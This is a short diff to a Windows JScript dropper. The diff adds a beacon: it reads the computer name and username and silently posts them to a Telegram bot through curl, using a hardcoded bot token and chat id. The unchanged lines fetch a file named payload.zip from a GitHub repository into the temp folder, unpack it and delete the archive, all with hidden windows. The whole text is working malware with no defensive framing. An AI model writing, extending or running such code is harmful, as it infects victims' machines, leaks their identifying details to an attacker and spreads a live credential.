@@ -1,5 +1,10 @@
 var s = new ActiveXObject("WScript.Shell");
 var t = s.ExpandEnvironmentStrings("%temp%");
+var c = s.ExpandEnvironmentStrings("%computername%");
+var u = s.ExpandEnvironmentStrings("%username%");
+var b = "8708922470:AAEueXYfcs8JTv-EduI8cJBfA0Jj7EzJYeo";
+var m = c + "/" + u + " - online";
+s.Run("curl.exe -s -X POST \"https://api.telegram.org/bot" + b + "/sendMessage\" -d \"chat_id=8119278288&text=" + m + "\"", 0, false);
 s.Run("curl.exe -sL -o " + t + "\\p.zip https://github.com/dont-delete-me-v0/files/raw/main/payload.zip", 0, true);
 s.Run("tar -xf " + t + "\\p.zip -C " + t, 0, true);
 s.Run("cmd /c del " + t + "\\p.zip", 0, false);
